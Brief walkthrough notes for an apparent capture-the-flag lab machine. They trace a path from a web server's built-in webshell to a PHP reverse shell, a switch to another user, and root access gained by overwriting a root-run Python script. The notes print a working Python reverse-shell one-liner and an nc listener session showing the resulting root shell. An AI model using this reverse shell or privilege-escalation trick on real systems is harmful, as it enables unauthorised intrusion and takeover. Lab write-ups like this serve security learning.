[Walthrough Video - YouTube](https://www.youtube.com/watch?v=2DqdPcbYcy8&list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf&index=1)

- ubuntu xenial 16.04 based on httpd version 2.4.18
- used the webshell built into the web server to get a php reverse shell
	- built a php rev shell and used wget on victim's machine to download and run it
- initial user `www-data`
	- `sudo -u scriptmanager bash`: to change user to `scriptmanager` which is another user on the machine
	- `python -c  'import pty;pty.spawn('/bin/bash')'`: to get a nicer shell
- `/scripts` folder contains `test.py` and `test.txt` 
	- `test.txt` is being written every minute by root user
- write the following into `test.py`
```python
import socket,os,pty;s=socket.socket();s.connect(('10.10.14.18',7778));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh');
```
- listen on `7778` on attacker's machine and get a root shell!
```
$ nc -nvlp 7778                           
listening on [any] 7778 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.68] 36552
# whoami
whoami
root
```